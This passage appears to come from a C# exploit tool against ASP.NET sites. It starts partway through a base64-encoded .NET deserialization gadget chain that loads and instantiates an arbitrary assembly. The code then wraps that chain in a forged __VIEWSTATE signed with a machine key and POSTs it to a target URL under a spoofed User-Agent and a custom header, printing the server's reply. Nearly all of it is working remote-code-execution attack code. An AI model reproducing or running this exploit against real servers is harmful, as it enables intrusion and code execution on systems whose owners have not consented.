VyYWJsZStXaGVyZVNlbGVjdEVudW1lcmFibGVJdGVyYXRvcmAyW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLk9iamVjdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0EAAAACSIAAAAQGAAAAAcAAAAJBwAAAAoJNQAAAAoICAAAAAAKCAgBAAAAARkAAAAPAAAABjYAAAApU3lzdGVtLldlYi5VSS5XZWJDb250cm9scy5QYWdlZERhdGFTb3VyY2UEAAAABjcAAABNU3lzdGVtLldlYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWIwM2Y1ZjdmMTFkNTBhM2EQGgAAAAcAAAAJCAAAAAgIAAAAAAgICgAAAAgBAAgBAAgBAAgIAAAAAAEbAAAADwAAAAY5AAAAKVN5c3RlbS5Db21wb25lbnRNb2RlbC5EZXNpZ24uRGVzaWduZXJWZXJiBAAAAAY6AAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkQHAAAAAUAAAANAgk7AAAACAgDAAAACQsAAAABHQAAAA8AAAAGPQAAADRTeXN0ZW0uUnVudGltZS5SZW1vdGluZy5DaGFubmVscy5BZ2dyZWdhdGVEaWN0aW9uYXJ5BAAAAAY+AAAAS21zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4ORAeAAAAAQAAAAkJAAAAEB8AAAACAAAACQoAAAAJCgAAABAgAAAAAgAAAAZBAAAAAAlBAAAABCQAAAAiU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgIAAAAIRGVsZWdhdGUHbWV0aG9kMAMDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeS9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcglCAAAACUMAAAABKAAAACQAAAAJRAAAAAlFAAAAASwAAAAkAAAACUYAAAAJRwAAAAEwAAAAJAAAAAlIAAAACUkAAAABMQAAACQAAAAJSgAAAAlLAAAAATUAAAAkAAAACUwAAAAJTQAAAAE7AAAABAAAAAlOAAAACU8AAAAEQgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRUeXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQZQAAAA1QFTeXN0ZW0uRnVuY2AyW1tTeXN0ZW0uQnl0ZVtdLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JPgAAAAoJPgAAAAZSAAAAGlN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5BlMAAAAETG9hZAoEQwAAAC9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgcAAAAETmFtZQxBc3NlbWJseU5hbWUJQ2xhc3NOYW1lCVNpZ25hdHVyZQpTaWduYXR1cmUyCk1lbWJlclR5cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEBAAMIDVN5c3RlbS5UeXBlW10JUwAAAAk+AAAACVIAAAAGVgAAACdTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseSBMb2FkKEJ5dGVbXSkGVwAAAC5TeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseSBMb2FkKFN5c3RlbS5CeXRlW10pCAAAAAoBRAAAAEIAAAAGWAAAAMwCU3lzdGVtLkZ1bmNgMltbU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHksIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJhYmxlYDFbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JPgAAAAoJPgAAAAlSAAAABlsAAAAIR2V0VHlwZXMKAUUAAABDAAAACVsAAAAJPgAAAAlSAAAABl4AAAAYU3lzdGVtLlR5cGVbXSBHZXRUeXBlcygpBl8AAAAYU3lzdGVtLlR5cGVbXSBHZXRUeXBlcygpCAAAAAoBRgAAAEIAAAAGYAAAALYDU3lzdGVtLkZ1bmNgMltbU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1lcmFibGVgMVtbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYXRvcmAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCT4AAAAKCT4AAAAGYgAAAIQBU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1lcmFibGVgMVtbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBmMAAAANR2V0RW51bWVyYXRvcgoBRwAAAEMAAAAJYwAAAAk+AAAACWIAAAAGZgAAAEVTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYXRvcmAxW1N5c3RlbS5UeXBlXSBHZXRFbnVtZXJhdG9yKCkGZwAAAJQBU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1lcmF0b3JgMVtbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dIEdldEVudW1lcmF0b3IoKQgAAAAKAUgAAABCAAAABmgAAADAAlN5c3RlbS5GdW5jYDJbW1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJhdG9yYDFbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLkJvb2xlYW4sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCT4AAAAKCT4AAAAGagAAAB5TeXN0ZW0uQ29sbGVjdGlvbnMuSUVudW1lcmF0b3IGawAAAAhNb3ZlTmV4dAoBSQAAAEMAAAAJawAAAAk+AAAACWoAAAAGbgAAABJCb29sZWFuIE1vdmVOZXh0KCkGbwAAABlTeXN0ZW0uQm9vbGVhbiBNb3ZlTmV4dCgpCAAAAAoBSgAAAEIAAAAGcAAAAL0CU3lzdGVtLkZ1bmNgMltbU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1lcmF0b3JgMVtbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JPgAAAAoJPgAAAAZyAAAAhAFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYXRvcmAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GcwAAAAtnZXRfQ3VycmVudAoBSwAAAEMAAAAJcwAAAAk+AAAACXIAAAAGdgAAABlTeXN0ZW0uVHlwZSBnZXRfQ3VycmVudCgpBncAAAAZU3lzdGVtLlR5cGUgZ2V0X0N1cnJlbnQoKQgAAAAKAUwAAABCAAAABngAAADGAVN5c3RlbS5GdW5jYDJbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uT2JqZWN0LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQk+AAAACgk+AAAABnoAAAAQU3lzdGVtLkFjdGl2YXRvcgZ7AAAADkNyZWF0ZUluc3RhbmNlCgFNAAAAQwAAAAl7AAAACT4AAAAJegAAAAZ+AAAAKVN5c3RlbS5PYmplY3QgQ3JlYXRlSW5zdGFuY2UoU3lzdGVtLlR5cGUpBn8AAAApU3lzdGVtLk9iamVjdCBDcmVhdGVJbnN0YW5jZShTeXN0ZW0uVHlwZSkIAAAACgFOAAAADwAAAAaAAAAAJlN5c3RlbS5Db21wb25lbnRNb2RlbC5EZXNpZ24uQ29tbWFuZElEBAAAAAk6AAAAEE8AAAACAAAACYIAAAAICAAgAAAEggAAAAtTeXN0ZW0uR3VpZAsAAAACX2ECX2ICX2MCX2QCX2UCX2YCX2cCX2gCX2kCX2oCX2sAAAAAAAAAAAAAAAgHBwICAgICAgICExPSdO4q0RGL+wCgyQ8m9wsL";

                byte[] payload2 = System.Convert.FromBase64String(xaml_payload2);
                string data2 = CreateViewState(payload2, generator, key);
  
                HttpWebRequest hwr = WebRequest.Create(targeturl) as HttpWebRequest;
                hwr.AllowAutoRedirect = false;
                hwr.Method = "POST";
                hwr.UserAgent = "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36xxxxx";
                hwr.ContentType = "application/x-www-form-urlencoded";
                hwr.Headers.Add("Value", "00HGAT3K0AXHV2RF2W0G");
                hwr.Proxy = null;
                byte[] post = Encoding.UTF8.GetBytes("__VIEWSTATE="+HttpUtility.UrlEncode(data2)+"&__VIEWSTATEGENERATOR="+generator);
                hwr.ContentLength = post.Length;
                hwr.GetRequestStream().Write(post,0,post.Length);
                HttpWebResponse res = hwr.GetResponse() as HttpWebResponse;
                Console.WriteLine(res.StatusCode);

                for(int i=0;i<res.Headers.Keys.Count;i++)
                {
                    Console.WriteLine(String.Format("{0,-20}{1}",res.Headers.Keys[i],res.Headers.Get(i)));
                }

                Stream instream = res.GetResponseStream();
                StreamReader sr = new StreamReader(instream, Encoding.UTF8);    
                string content = sr.ReadToEnd();                    
                Console.WriteLine(content);       
               
            }
           
            catch (Exception e)
            {
                Console.WriteLine("{0}", e.Message);
                System.Environment.Exit(0);
            }
        }

    }
}